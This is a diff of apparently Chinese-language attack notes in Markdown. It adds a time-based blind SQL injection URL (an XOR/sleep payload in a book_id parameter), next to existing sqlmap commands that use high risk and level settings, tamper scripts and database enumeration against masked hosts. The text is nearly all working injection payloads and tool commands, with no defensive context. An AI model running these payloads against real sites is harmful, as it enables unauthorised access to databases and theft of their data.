@@ -25,6 +25,10 @@ python3 sqlmap.py -u "http://m.xxx.com/books/areward?book_id=1&gift_id=1" -p boo
 python3 sqlmap.py -u "http://m.xxx.com/books/areward?book_id=1&gift_id=1" -p book_id --dbms=mysql  --level=5 --risk=3 --tamper=space2comment.py,between.py --current-db --random-agent --time-sec=10 --batch
 ```
 
+sql注入
+```
+http://www.xxx.com/?a=detail&book_id=1590'XOR(159*if(now()=sysdate()%2Csleep(26)%2C0))XOR'Z&replyid=92&s=commit
+````
 
 ### 漏洞回显
 ```
